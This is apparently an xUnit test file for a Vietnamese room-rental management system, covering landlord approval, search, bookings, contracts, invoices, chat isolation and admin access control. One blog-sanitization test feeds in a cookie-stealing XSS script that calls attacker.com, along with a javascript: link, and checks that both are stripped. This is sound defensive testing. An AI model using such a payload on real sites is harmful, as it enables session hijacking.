using System;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Caching.Memory;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.Logging.Abstractions;
using Moq;
using QuanLyPhongTro.Areas.Admin.Data;
using QuanLyPhongTro.Models;
using QuanLyPhongTro.Models.ViewModels;
using QuanLyPhongTro.Services;
using Xunit;

namespace QuanLyPhongTro.Tests
{
    public class EndToEndRegressionTests
    {
        private static RoomService CreateRoomService(DataContext context)
        {
            var uploadMock = new Mock<IFileUploadService>();
            var configMock = new Mock<IConfiguration>();
            return new RoomService(context, uploadMock.Object, configMock.Object, NullLogger<RoomService>.Instance);
        }

        [Fact]
        public async Task Flow1_LandlordRegistration_Approval_RoomCreation_AndPublishing()
        {
            // Luồng 1: Chủ trọ đăng ký -> SuperAdmin duyệt -> chủ trọ tạo khu trọ + phòng + ảnh -> đăng tin -> SuperAdmin duyệt -> public
            var context = TestHelper.CreateInMemoryContext();
            TestHelper.SeedStandardTestData(context);
            var cache = new MemoryCache(new MemoryCacheOptions());
            var searchService = new RoomSearchService(context, cache, NullLogger<RoomSearchService>.Instance);
            var roomService = CreateRoomService(context);

            // 1. Chủ trọ đăng ký mới
            var newLandlord = new tblLandlord
            {
                LandlordId = 101,
                FullName = "Phạm Đăng Ký Mới",
                Phone = "0987654321",
                Email = "newlandlord@gmail.com",
                Status = LandlordStatus.Pending,
                CreatedAt = DateTime.UtcNow
            };
            context.Landlords.Add(newLandlord);
            await context.SaveChangesAsync();
            Assert.Equal(LandlordStatus.Pending, newLandlord.Status);

            // 2. SuperAdmin duyệt chủ trọ
            newLandlord.Status = LandlordStatus.Approved;
            newLandlord.UpdatedAt = DateTime.UtcNow;
            await context.SaveChangesAsync();
            Assert.Equal(LandlordStatus.Approved, newLandlord.Status);

            // 3. Chủ trọ tạo khu trọ
            var newProperty = new tblProperty
            {
                PropertyId = 101,
                LandlordId = newLandlord.LandlordId,
                Name = "Tòa Nhà Hoa Hồng",
                ProvinceId = 1,
                DistrictId = 1,
                WardId = 1,
                Address = "100 Cầu Giấy, Hà Nội",
                Status = PropertyStatus.Active,
                CreatedAt = DateTime.UtcNow
            };
            context.Properties.Add(newProperty);
            await context.SaveChangesAsync();

            // 4. Chủ trọ tạo phòng + ảnh, gửi đăng tin
            var newRoom = new tblRoom
            {
                RoomId = 101,
                PropertyId = newProperty.PropertyId,
                RoomTypeId = 1,
                RoomCode = "P301",
                RoomName = "Phòng 301",
                Title = "Phòng trọ ban công thoáng mát",
                Slug = "phong-tro-ban-cong-thoang-mat-101",
                RoomPrice = 3200000,
                Area = 22,
                MaxOccupants = 2,
                Status = RoomStatus.Available,
                ApprovalStatus = RoomApprovalStatus.Pending, // Chờ duyệt
                IsPublished = false,
                CreatedAt = DateTime.UtcNow
            };
            context.Rooms.Add(newRoom);
            context.RoomImages.Add(new tblRoomImage { ImageId = 101, RoomId = 101, Url = "/uploads/rooms/r101.jpg", IsPrimary = true });
            await context.SaveChangesAsync();

            // Lúc này phòng chưa được duyệt, không xuất hiện ở sàn
            var initialSearch = await searchService.SearchRoomsAsync(new RoomFilterCriteria { Keyword = "ban công" });
            Assert.DoesNotContain(initialSearch.Items, r => r.RoomId == 101);

            // 5. SuperAdmin duyệt tin
            var (approveOk, _) = await roomService.ApproveListingAsync(101);
            Assert.True(approveOk);

            // 6. Phòng chính thức xuất hiện trên sàn
            var publicSearch = await searchService.SearchRoomsAsync(new RoomFilterCriteria { Keyword = "ban công" });
            Assert.Contains(publicSearch.Items, r => r.RoomId == 101);
            Assert.Equal(RoomApprovalStatus.Published, (await context.Rooms.FindAsync(101))!.ApprovalStatus);
        }

        [Fact]
        public async Task Flow2_GuestSearch_ViewDetail_Favorite_And_BookingRequest()
        {
            // Luồng 2: Khách tìm phòng bằng bộ lọc -> xem chi tiết -> yêu thích -> đặt lịch xem -> chủ trọ nhận yêu cầu
            var context = TestHelper.CreateInMemoryContext();
            TestHelper.SeedStandardTestData(context);
            var cache = new MemoryCache(new MemoryCacheOptions());
            var searchService = new RoomSearchService(context, cache, NullLogger<RoomSearchService>.Instance);

            // 1. Khách tìm phòng ở Cầu Giấy (ProvinceId = 1)
            var searchResult = await searchService.SearchRoomsAsync(new RoomFilterCriteria
            {
                ProvinceId = 1,
                MinPrice = 3000000,
                MaxPrice = 4000000
            });
            Assert.NotEmpty(searchResult.Items);
            var targetRoom = searchResult.Items.First(r => r.RoomId == 2);
            Assert.Equal(2, targetRoom.RoomId);

            // 2. Khách xem chi tiết phòng
            var roomDetail = await context.Rooms
                .Include(r => r.Property).ThenInclude(p => p!.Landlord)
                .FirstOrDefaultAsync(r => r.RoomId == targetRoom.RoomId);
            Assert.NotNull(roomDetail);
            Assert.Equal(1, roomDetail.Property!.LandlordId);

            // 3. Khách thêm vào yêu thích
            int guestTenantId = 1;
            context.Favorites.Add(new tblFavorite
            {
                TenantId = guestTenantId,
                RoomId = roomDetail.RoomId,
                CreatedAt = DateTime.UtcNow
            });
            await context.SaveChangesAsync();

            var favoriteCount = await context.Favorites.CountAsync(f => f.TenantId == guestTenantId && f.RoomId == roomDetail.RoomId);
            Assert.Equal(1, favoriteCount);

            // 4. Khách đặt lịch xem phòng
            var booking = new tblBookingRequest
            {
                RoomId = roomDetail.RoomId,
                LandlordId = roomDetail.Property.LandlordId, // Gắn tự động theo phòng
                FullName = "Nguyễn Văn Khách",
                Phone = "0911223344",
                PreferredDate = DateTime.UtcNow.AddDays(1).ToString("yyyy-MM-dd"),
                ViewingTime = DateTime.UtcNow.AddDays(1),
                Message = "Tôi muốn đến xem trực tiếp chiều mai",
                Status = BookingRequestStatus.Pending,
                CreatedAt = DateTime.UtcNow
            };
            context.BookingRequests.Add(booking);
            await context.SaveChangesAsync();

            // 5. Chủ trọ nhận yêu cầu và xác nhận
            var landlordRequests = await context.BookingRequests
                .Where(b => b.LandlordId == 1 && b.Status == BookingRequestStatus.Pending)
                .ToListAsync();
            Assert.Contains(landlordRequests, b => b.Phone == "0911223344");

            // Chủ trọ xác nhận
            booking.Status = BookingRequestStatus.Accepted;
            await context.SaveChangesAsync();

            Assert.Equal(BookingRequestStatus.Accepted, (await context.BookingRequests.FindAsync(booking.RequestId))!.Status);
        }

        [Fact]
        public async Task Flow3_Tenant_Contract_MonthlyInvoice_VietQR_Payment_And_Review()
        {
            // Luồng 3: Chủ trọ tạo khách thuê -> hợp đồng -> hóa đơn tháng -> VietQR -> đánh dấu đã thanh toán -> khách đánh giá
            var context = TestHelper.CreateInMemoryContext();
            TestHelper.SeedStandardTestData(context);

            var landlord1 = await context.Landlords.FindAsync(1);
            Assert.NotNull(landlord1);

            // 1. Tạo khách thuê
            var tenant = new tblTenant
            {
                TenantId = 50,
                FullName = "Đỗ Minh Thuê",
                Phone = "0944556677",
                IdentityNumber = "035123456789",
                IsActive = true
            };
            context.Tenants.Add(tenant);
            await context.SaveChangesAsync();

            // 2. Tạo hợp đồng
            var contract = new tblContract
            {
                ContractId = 50,
                ContractCode = "HD50",
                LandlordId = landlord1.LandlordId,
                RoomId = 2,
                TenantId = tenant.TenantId,
                StartDate = DateTime.UtcNow.Date,
                EndDate = DateTime.UtcNow.Date.AddMonths(12),
                MonthlyRent = 3800000,
                Deposit = 3800000,
                Status = ContractStatus.Active
            };
            context.Contracts.Add(contract);
            await context.SaveChangesAsync();

            // 3. Tạo hóa đơn tháng
            var invoice = new tblInvoice
            {
                InvoiceId = 50,
                InvoiceCode = "HD-FLOW3-01",
                LandlordId = landlord1.LandlordId,
                RoomId = 2,
                ContractId = contract.ContractId,
                BillingMonth = DateTime.UtcNow.Month,
                BillingYear = DateTime.UtcNow.Year,
                RoomRentAmount = 3800000,
                TotalServiceAmount = 620000,
                TotalAmount = 4420000,
                Status = InvoiceStatus.Unpaid,
                DueDate = DateTime.UtcNow.AddDays(5)
            };
            context.Invoices.Add(invoice);
            await context.SaveChangesAsync();

            // 4. Sinh URL VietQR thanh toán chuẩn
            string encodedDesc = Uri.EscapeDataString($"THANH TOAN {invoice.InvoiceCode}");
            string vietQrUrl = $"https://img.vietqr.io/image/{landlord1.BankId}-{landlord1.AccountNumber}-compact2.png?amount={invoice.TotalAmount}&addInfo={encodedDesc}&accountName={Uri.EscapeDataString(landlord1.AccountName ?? "")}";

            Assert.Contains(landlord1.BankId, vietQrUrl);
            Assert.Contains(landlord1.AccountNumber, vietQrUrl);
            Assert.Contains("4420000", vietQrUrl);

            // 5. Đánh dấu đã thanh toán
            invoice.Status = InvoiceStatus.Paid;
            invoice.PaidDate = DateTime.UtcNow;
            await context.SaveChangesAsync();
            Assert.Equal(InvoiceStatus.Paid, (await context.Invoices.FindAsync(invoice.InvoiceId))!.Status);

            // 6. Khách đánh giá phòng (Chỉ cho phép khi có hợp đồng tại phòng này)
            bool hasValidContract = await context.Contracts.AnyAsync(c =>
                c.TenantId == tenant.TenantId &&
                c.RoomId == 2 &&
                c.Status == ContractStatus.Active);
            Assert.True(hasValidContract);

            var review = new tblReview
            {
                ReviewId = 1,
                ContractId = contract.ContractId,
                FullName = "Đỗ Minh Thuê",
                Email = "dominhthue@gmail.com",
                Title = "Đánh giá chất lượng phòng",
                Content = "Phòng rất sạch đẹp, chủ trọ nhiệt tình hỗ trợ!",
                Rating = 5,
                IsApproved = true,
                CreatedAt = DateTime.UtcNow
            };
            context.Reviews.Add(review);
            await context.SaveChangesAsync();

            var savedReview = await context.Reviews.FirstOrDefaultAsync(r => r.ContractId == contract.ContractId);
            Assert.NotNull(savedReview);
            Assert.Equal(5, savedReview.Rating);

            // Thử một khách KHÔNG có hợp đồng đánh giá -> từ chối
            int strangerTenantId = 999;
            bool strangerCanReview = await context.Contracts.AnyAsync(c =>
                c.TenantId == strangerTenantId &&
                c.RoomId == 2 &&
                c.Status == ContractStatus.Active);
            Assert.False(strangerCanReview);
        }

        [Fact]
        public async Task Flow4_ChatbotAndLiveChat_IsIsolatedByLandlord()
        {
            // Luồng 4: Chatbot AI và live chat theo chủ trọ
            var context = TestHelper.CreateInMemoryContext();
            TestHelper.SeedStandardTestData(context);

            // Khách A chat với Chủ trọ 1
            var session1 = new tblChatSession
            {
                SessionId = 1,
                LandlordId = 1,
                SessionKey = "guest_session_1",
                GuestName = "Khách A",
                GuestPhone = "0911223344",
                CreatedAt = DateTime.UtcNow
            };
            context.ChatSessions.Add(session1);

            var msg1 = new tblChatMessage
            {
                MessageId = 1,
                SessionId = 1,
                SenderType = ChatSenderType.Guest,
                Content = "Chào chủ trọ 1, phòng 101 còn trống không?",
                CreatedAt = DateTime.UtcNow,
                IsReadByAdmin = false
            };
            context.ChatMessages.Add(msg1);

            // Khách B chat với Chủ trọ 2
            var session2 = new tblChatSession
            {
                SessionId = 2,
                LandlordId = 2,
                SessionKey = "guest_session_2",
                GuestName = "Khách B",
                GuestPhone = "0922334455",
                CreatedAt = DateTime.UtcNow
            };
            context.ChatSessions.Add(session2);

            var msg2 = new tblChatMessage
            {
                MessageId = 2,
                SessionId = 2,
                SenderType = ChatSenderType.Guest,
                Content = "Chào chủ trọ 2, giá phòng có bớt không?",
                CreatedAt = DateTime.UtcNow,
                IsReadByAdmin = false
            };
            context.ChatMessages.Add(msg2);
            await context.SaveChangesAsync();

            // Chủ trọ 1 kiểm tra tin nhắn của mình
            var landlord1Messages = await context.ChatSessions
                .Where(s => s.LandlordId == 1)
                .SelectMany(s => s.Messages)
                .ToListAsync();

            Assert.Single(landlord1Messages);
            Assert.Equal("Chào chủ trọ 1, phòng 101 còn trống không?", landlord1Messages.First().Content);

            // Chủ trọ 2 kiểm tra tin nhắn của mình
            var landlord2Messages = await context.ChatSessions
                .Where(s => s.LandlordId == 2)
                .SelectMany(s => s.Messages)
                .ToListAsync();

            Assert.Single(landlord2Messages);
            Assert.Equal("Chào chủ trọ 2, giá phòng có bớt không?", landlord2Messages.First().Content);
        }

        [Fact]
        public async Task Flow5_BlogSummernote_SanitizationAndPersistence()
        {
            // Luồng 5: Blog với Summernote + elFinder (Nội dung được sanitize chống XSS)
            var context = TestHelper.CreateInMemoryContext();

            var rawHtmlPost = @"
                <h2>Kinh nghiệm thuê phòng trọ sinh viên</h2>
                <p>Cần kiểm tra kỹ hợp đồng và hóa đơn điện nước trước khi ký.</p>
                <img src='/uploads/blog/room-guide.jpg' alt='Hướng dẫn' />
                <script>fetch('http://attacker.com/steal-cookie?cookie=' + document.cookie);</script>
                <a href='javascript:alert(1)'>Click xem thêm</a>
            ";

            var cleanContent = HtmlSanitizerHelper.SanitizeHtml(rawHtmlPost);

            var post = new tblPost
            {
                PostId = 1,
                Title = "Kinh nghiệm thuê phòng trọ sinh viên 2026",
                Slug = "kinh-nghiem-thue-phong-tro-sinh-vien-2026",
                Content = cleanContent,
                IsPublished = true,
                CreatedAt = DateTime.UtcNow
            };
            context.Posts.Add(post);
            await context.SaveChangesAsync();

            var savedPost = await context.Posts.FindAsync(1);
            Assert.NotNull(savedPost);
            Assert.DoesNotContain("<script", savedPost.Content, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("javascript:", savedPost.Content, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<h2>Kinh nghiệm thuê phòng trọ sinh viên</h2>", savedPost.Content);
            Assert.Contains("<img src='/uploads/blog/room-guide.jpg'", savedPost.Content);
        }

        [Fact]
        public async Task Flow6_LegacySystemFunctionality_RemainsFullyIntactWithBackfilledData()
        {
            // Luồng 6: Toàn bộ chức năng gốc của hệ thống cũ (dữ liệu mặc định đã backfill) vẫn hoạt động
            var context = TestHelper.CreateInMemoryContext();
            TestHelper.SeedStandardTestData(context);

            // Dữ liệu ban đầu trước khi nâng cấp sàn đa chủ trọ được gắn LandlordId = 1 (mặc định) thông qua Property
            var legacyRooms = await context.Rooms
                .Include(r => r.Property)
                .Where(r => r.Property != null && r.Property.LandlordId == 1)
                .ToListAsync();
            Assert.NotEmpty(legacyRooms);

            var legacyContracts = await context.Contracts.Where(c => c.LandlordId == 1).ToListAsync();
            Assert.NotEmpty(legacyContracts);

            var legacyInvoices = await context.Invoices.Where(i => i.LandlordId == 1).ToListAsync();
            Assert.NotEmpty(legacyInvoices);

            // Tính toán tổng thu của chủ trọ mặc định không gặp lỗi null reference
            var totalLegacyRevenue = legacyInvoices.Where(i => i.Status == InvoiceStatus.Paid).Sum(i => i.TotalAmount);
            Assert.True(totalLegacyRevenue > 0);

            // Kiểm tra các thuộc tính cốt lõi không bị mất
            foreach (var r in legacyRooms)
            {
                Assert.True(r.RoomPrice > 0);
                Assert.False(string.IsNullOrEmpty(r.RoomCode));
            }
        }

        [Fact]
        public async Task Flow9_LandlordRegistration_PendingWorkflow_AndAccessControl()
        {
            var context = TestHelper.CreateInMemoryContext();
            TestHelper.SeedStandardTestData(context);

            // 1. Khách gửi hồ sơ đăng ký chủ trọ từ trang Đăng tin
            var regLandlord = new tblLandlord
            {
                FullName = "Nguyễn Văn Đăng Ký",
                Phone = "0911223344",
                Email = "chutromoi@gmail.com",
                IdentityNumber = "038099001122",
                Address = "Vinh, Nghệ An",
                BankName = "Vietcombank",
                AccountNumber = "9988776655",
                AccountName = "NGUYEN VAN DANG KY",
                Status = LandlordStatus.Pending,
                CreatedAt = DateTime.UtcNow
            };
            context.Landlords.Add(regLandlord);
            await context.SaveChangesAsync();

            // Xác minh trạng thái ban đầu là Pending
            Assert.Equal(LandlordStatus.Pending, regLandlord.Status);

            // 2. SuperAdmin kiểm tra danh sách chờ duyệt
            var pendingList = await context.Landlords.Where(l => l.Status == LandlordStatus.Pending).ToListAsync();
            Assert.Contains(pendingList, l => l.IdentityNumber == "038099001122");

            // 3. SuperAdmin phê duyệt chủ trọ
            regLandlord.Status = LandlordStatus.Approved;
            regLandlord.UpdatedAt = DateTime.UtcNow;
            await context.SaveChangesAsync();

            Assert.Equal(LandlordStatus.Approved, regLandlord.Status);

            // 4. Kiểm tra các Controller độc quyền của SuperAdmin có gắn attribute [SuperAdminOnly]
            var superAdminOnlyType = typeof(QuanLyPhongTro.Areas.Admin.Attributes.SuperAdminOnlyAttribute);

            var superAdminControllers = new[]
            {
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.LandlordController),
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.UserController),
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.AmenityController),
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.RoomTypeController),
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.LocationController),
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.PostController),
                typeof(QuanLyPhongTro.Areas.Admin.Controllers.FileManagerController)
            };

            foreach (var ctrl in superAdminControllers)
            {
                bool hasAttr = ctrl.GetCustomAttributes(superAdminOnlyType, true).Any();
                Assert.True(hasAttr, $"Controller {ctrl.Name} phải được bảo vệ bởi attribute [SuperAdminOnly] để ngăn chủ trọ truy cập.");
            }
        }
    }
}
